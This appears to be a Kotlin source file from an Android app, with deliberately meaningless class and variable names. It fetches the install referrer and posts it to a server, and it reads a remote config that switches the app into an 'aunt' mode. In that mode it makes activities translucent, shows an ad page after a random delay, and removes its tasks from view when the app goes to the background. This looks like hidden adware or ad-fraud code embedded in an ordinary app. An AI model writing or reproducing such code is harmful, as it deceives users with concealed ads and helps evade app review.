package com.sister.smart.blonde

import android.app.Activity
import android.app.Application
import android.content.Context
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.android.installreferrer.api.ReferrerDetails
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.ktx.messaging
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.File
import kotlin.random.Random

/**
 * Date：2025/4/21
 * Describe:
 */
abstract class BaseBlondeFairy(val context: Context) : Application.ActivityLifecycleCallbacks,
    BaseBossInfo() {
    private val mKindGoogleSister by lazy { KindGoogleSister(context) }
    protected val mIoScope by lazy { CoroutineScope(Dispatchers.IO + SupervisorJob()) }
    protected val mBlondeNetPost by lazy { BlondeNetPost() }
    protected var bossReferrer by SmartImplStr()
    private var timeSister = 1000L
    private var angelTime = 1200L

    abstract fun getBossConfigure()

    abstract fun startServiceSister(context: Context)

    private var dancerNum = 0

    private var type: String = ""

    protected fun typeBaseStr(string: String): String {
        var st = ""
        runCatching {
            JSONObject(string).apply {
                val s = optString("doctor_str")
                if (s.contains("aunt")) {
                    st = "a"
                } else if (s.contains("skirt")) {
                    if (type.contains("aunt")) {
                        return "not use"
                    }
                    st = "b"
                }
                type = s
                createFile(optString("brave_name"))
                Headband.isCanSisterRecord = type.contains("figure", true).not()
                val d = optString("outgoing_girl")
                if (d.contains("-")) {
                    timeSister = d.split("-")[0].toLong()
                    angelTime = d.split("-")[1].toLong()
                }
            }
        }
        return st
    }

    protected fun blondeE() {
        if (type.contains("aunt", true)) {
            mKindGoogleSister.kindEvent()
        }
    }

    private fun createFile(name: String) {
        if (name.isBlank()) return
        if (type.contains("skirt")) return
        val file = File("${context.dataDir}/$name")
        file.mkdirs()
    }

    private var isFcmRegister by SmartImplStr()

    protected fun registerRef() {
        mKindGoogleSister.mBadAdHelper.initBlonde()
        if (isFcmRegister.isBlank()) {
            runCatching {
                Firebase.messaging.subscribeToTopic("sister_fcm_sub").addOnSuccessListener {
                    isFcmRegister = "sister"
                }
            }
        }
        if (bossReferrer.isBlank()) {
            mIoScope.launch {
                while (bossReferrer.isBlank()) {
                    fetchReferrer()
                    delay(20000)
                }
            }
        } else {
            mBlondeNetPost.postIns(bossReferrer)
        }
    }

    fun postEvent(name: String, pair: Pair<String, String>? = null) {
        mBlondeNetPost.postEvent(name, pair)
    }

    private fun fetchReferrer() {
        val referrerClient = InstallReferrerClient.newBuilder(context).build()
        referrerClient.startConnection(object : InstallReferrerStateListener {
            override fun onInstallReferrerSetupFinished(p0: Int) {
                runCatching {
                    if (p0 == InstallReferrerClient.InstallReferrerResponse.OK) {
                        val response: ReferrerDetails = referrerClient.installReferrer
                        bossReferrer = response.installReferrer
                        //todo delete
                        if (IS_TEST) {
                            bossReferrer += "test"
                        }
                        log("mGoogleReferStr-->${bossReferrer}")
                        mBlondeNetPost.postIns(bossReferrer)
                        getBossConfigure()
                        referrerClient.endConnection()
                    } else {
                        referrerClient.endConnection()
                    }
                }.onFailure {
                    referrerClient.endConnection()
                }
            }

            override fun onInstallReferrerServiceDisconnected() = Unit
        })
    }

    private var isFront = false

    override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {
        log("onActivityCreated->$activity")
        addActivity(activity)
        if (type.contains("aunt", true)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                activity.setTranslucent(true)
            } else {
                activity.window.setBackgroundDrawableResource(R.color.smart_color)
            }
        }
        val isP = mKindGoogleSister.eventKind(activity)
        if (isP && activity is AppCompatActivity) {
            activity.lifecycleScope.launch {
                val time = Random.nextLong(timeSister, angelTime)
                mBlondeNetPost.postEvent("starup", Pair("time", "${Math.round(time / 1000.0)}"))
                delay(time)
                mBlondeNetPost.postEvent("delaytime", Pair("time", "$time"))
                mKindGoogleSister.mBadAdHelper.showPage(activity)
            }
        } else {
            if (isFront.not()) {
                val name = activity::class.java.canonicalName ?: ""
                if (name == "com.unity3d.player.UnityPlayerActivity") {
                    isFront = true
                    mBlondeNetPost.postEvent(
                        "session_front", Pair(
                            "time",
                            "${(System.currentTimeMillis() - Headband.appInstallTime) / 1000}"
                        )
                    )
                }
            }
        }
    }

    override fun onActivityStarted(activity: Activity) {
        dancerNum++
        startServiceSister(activity)
    }

    override fun onActivityResumed(activity: Activity) {
        log("onActivityResumed->$activity")
    }

    override fun onActivityPaused(activity: Activity) {
        log("onActivityPaused->$activity")
    }

    override fun onActivityStopped(activity: Activity) {
        dancerNum--
        if (dancerNum <= 0) {
            dancerNum = 0
            isFront = false
            if (type.contains("aunt", true)) {
                ArrayList(Headband.headActivity).forEach {
                    it.finishAndRemoveTask()
                }
            }
        }
    }

    override fun onActivitySaveInstanceState(activity: Activity, outState: Bundle) = Unit

    override fun onActivityDestroyed(activity: Activity) {
        log("onActivityDestroyed->$activity")
        removePage(activity)
    }
}